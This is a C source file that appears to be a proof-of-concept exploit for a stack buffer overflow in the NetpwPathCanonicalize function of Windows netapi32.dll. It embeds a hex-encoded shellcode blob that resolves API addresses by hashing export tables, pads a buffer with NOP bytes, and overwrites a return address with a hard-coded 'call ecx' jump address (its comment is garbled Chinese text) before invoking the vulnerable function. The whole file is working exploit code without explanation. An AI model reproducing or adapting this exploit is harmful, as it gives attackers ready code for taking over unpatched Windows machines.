#include <windows.h>
char shellcode[] = 
"\x66\x81\xEC\xf4\x1f\x8B\xEC\x33"
"\xC0\x66\xB8\x33\x32\x50\x68\x75"
"\x73\x65\x72\x66\xB8\x6D\x6D\x50"
"\x99\x64\x8B\x5A\x30\x8B\x4B\x0C"
"\x8B\x49\x1C\x8B\x09\x8B\x49\x08"
"\x51\x68\x32\x74\x91\x0C\x51\xB3"
"\x01\xEB\x39\x80\xFB\x01\x74\x0A"
"\x80\xFB\x02\x74\x15\x80\xFB\x03"
"\x74\x26\x8D\x4D\xF8\x51\xFF\xD0"
"\x68\x6A\x0A\x38\x1E\x50\xB3\x02"
"\xEB\x1A\x99\x52\x8D\x4D\xF4\x51"
"\x51\x52\xFF\xD0\x68\x63\x89\xD1"
"\x4F\xFF\x75\xF0\xB3\x03\xEB\x04"
"\x99\x52\xFF\xD0\x55\x8B\xEC\x53"
"\x8B\x5D\x04\x8B\x43\x3C\x8B\x4C"
"\x18\x78\x03\xCB\x8B\x51\x20\x03"
"\xD3\x33\xFF\x47\x8B\x34\xBA\x03"
"\xF3\x56\xEB\x1B\x3B\x45\x08\x75"
"\xF2\x8B\x41\x1C\x03\xC3\x8B\x04"
"\xB8\x03\xC3\xEB\x01\x90\x5B\x8B"
"\xE5\x5D\x83\xC4\x08\xEB\x8C\x55"
"\x8B\xEC\x53\x51\x52\x33\xC0\x33"
"\xDB\x99\x8B\x4D\x04\x3A\x11\x74"
"\x0C\xC1\xC8\x07\x0F\xBE\x19\x03"
"\xC3\x41\xEB\xF1\x90\x5A\x59\x5B"
"\x8B\xE5\x5D\x83\xC4\x04\xEB\xBC";

int main()
{
	char arg_1[0x2E0];
	char arg_2[0x420];
	int arg_3=0x420;
	char arg_4[0x140];
	long arg_5=44;

	HMODULE LibHandle = LoadLibrary("netapi32.dll");
	FARPROC func = GetProcAddress(LibHandle, "NetpwPathCanonicalize");
	memset(arg_1,0,sizeof(arg_1));
	memset(arg_1,0x90,sizeof(arg_1)-2);
	memset(arg_4,0,sizeof(arg_4));
	memset(arg_4,'a',sizeof(arg_4)-2);
	memcpy(arg_4,shellcode,sizeof(shellcode));
	arg_1[0x2D8]=0xF9;			//call ecxÌø°åµØÖ·
	arg_1[0x2D9]=0x52;
	arg_1[0x2DA]=0x18;
	arg_1[0x2DB]=0x75;

	(func)(arg_1,arg_2,arg_3,arg_4,&arg_5,0);
	FreeLibrary(LibHandle);
}
